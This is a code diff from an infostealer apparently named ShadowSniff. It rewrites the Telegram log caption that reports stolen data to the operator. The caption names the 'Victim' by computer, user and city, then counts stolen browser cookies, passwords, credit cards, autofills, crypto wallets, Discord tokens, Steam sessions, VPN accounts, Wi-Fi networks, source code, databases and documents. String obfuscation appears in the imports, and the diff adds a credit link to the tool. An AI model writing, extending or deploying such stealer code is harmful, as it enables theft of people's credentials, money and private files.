@@ -1,17 +1,21 @@
 use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError};
+use alloc::fmt::format;
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
 use alloc::{format, vec};
-use collector::{Collector, Device, DisplayCollector};
+use collector::{Browser, Collector, Device, DisplayCollector, EmojiBoolean, FileGrabber, Software, Vpn};
 use core::fmt::{Display, Error, Formatter};
 use derive_new::new;
+use indoc::formatdoc;
+use ipinfo::{unwrapped_ip_info, IpInfo};
 use obfstr::obfstr as s;
 use requests::{
     write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request,
     RequestBuilder,
 };
-use utils::format_size;
+use utils::pc_info::PcInfo;
+use utils::{format_size, internal_code_to_flag};
 
 const TELEGRAM_MAX_FILE_SIZE: usize = 2 * 1024 * 1024 * 1024;
 
@@ -40,7 +44,68 @@ where
     P: AsRef<str>,
     C: Collector,
 {
-    let caption = DisplayCollector(collector).to_string();
+    let PcInfo { computer_name, user_name, product_name } = PcInfo::retrieve();
+    let IpInfo { country, city, .. } = unwrapped_ip_info();
+
+    let caption = formatdoc! {r#"
+            ✨ New log from {country_flag} <code>{city}</code>
+            Victim: <code>{computer_name}</code>/<code>{user_name}</code> on <code>{product_name}</code>
+
+            🔍 <b>Browser Data</b>
+            {first} 🍪 Cookies: <code>{cookies}</code>
+            {midd_} 🔐 Passwords: <code>{passwords}</code>
+            {midd_} 💳 Credit Cards: <code>{credit_cards}</code>
+            {midd_} ✍️ Autofills: <code>{auto_fills}</code>
+            {midd_} 🕘 History: <code>{history}</code>
+            {midd_} 📑 Bookmarks: <code>{bookmarks}</code>
+            {last_} ⬇️ Downloads: <code>{downloads}</code>
+
+            💻 <b>Installed Software</b>
+            {first} 👛 Wallets: <code>{wallets}</code>
+            {midd_} 📁 FTP Hosts: <code>{ftp_hosts}</code>
+            {midd_} 📲 Telegram: <code>{telegram}</code>
+            {midd_} 🎮 Discord Tokens: <code>{discord_tokens}</code>
+            {last_} 🕹️ Steam Sessions: <code>{steam_sessions}</code>
+
+            📂 <b>User Files</b>
+            {first} 🧑‍💻 Source Code: <code>{source_code}</code>
+            {midd_} 🗃️ Databases: <code>{databases}</code>
+            {last_} 📄 Documents: <code>{documents}</code>
+
+            🌐 <b>VPN Accounts</b>
+            {last_} 🔐 VPN Accounts: <code>{vpn_accounts}</code>
+
+            📶 <b>Device Data</b>
+            {last_} 📡 Wi-Fi Networks: <code>{wifi_networks}</code>
+        "#,
+        first = "<code>├─</code>",
+        last_ = "<code>└─</code>",
+        midd_ = "<code>├─</code>",
+
+        country_flag = internal_code_to_flag(&country).map(Arc::from).unwrap_or(country.clone()),
+
+        cookies = collector.get_browser().get_cookies(),
+        passwords = collector.get_browser().get_passwords(),
+        credit_cards = collector.get_browser().get_credit_cards(),
+        auto_fills = collector.get_browser().get_auto_fills(),
+        history = collector.get_browser().get_history(),
+        bookmarks = collector.get_browser().get_bookmarks(),
+        downloads = collector.get_browser().get_downloads(),
+
+        wallets = collector.get_software().get_wallets(),
+        ftp_hosts = collector.get_software().get_ftp_hosts(),
+        telegram = EmojiBoolean(collector.get_software().is_telegram()),
+        discord_tokens = collector.get_software().get_discord_tokens(),
+        steam_sessions = collector.get_software().get_steam_session(),
+
+        source_code = collector.get_file_grabber().get_source_code_files(),
+        databases = collector.get_file_grabber().get_database_files(),
+        documents = collector.get_file_grabber().get_documents(),
+
+        vpn_accounts = collector.get_vpn().get_accounts(),
+
+        wifi_networks = collector.get_device().get_wifi_networks()
+    };
 
     let link = match log_content {
         LogContent::ExternalLink(ExternalLink {
@@ -48,8 +113,8 @@ where
             link,
             size,
         }) => Some(format!(
-            r#"<a href="{link}">Download from {service_name} [{}]</a>"#,
-            format_size(*size as _)
+            r#"<a href="{link}">Download</a> from {service_name} <code>{size}</code>"#,
+            size = format_size(*size as _)
         )),
         _ => None,
     };
@@ -66,10 +131,13 @@ where
     if let Some(p) = password {
         parts.push(p);
     }
+
+    parts.push("\n<i>by <a href=\"https://github.com/sqlerrorthing/ShadowSniff\">SnadowSniff</a>, made with ❤️</i>".to_string());
+
     let thumbnail = if parts.is_empty() {
         None
     } else {
-        Some(parts.join(" "))
+        Some(parts.join("\n"))
     };
 
     (caption, thumbnail)
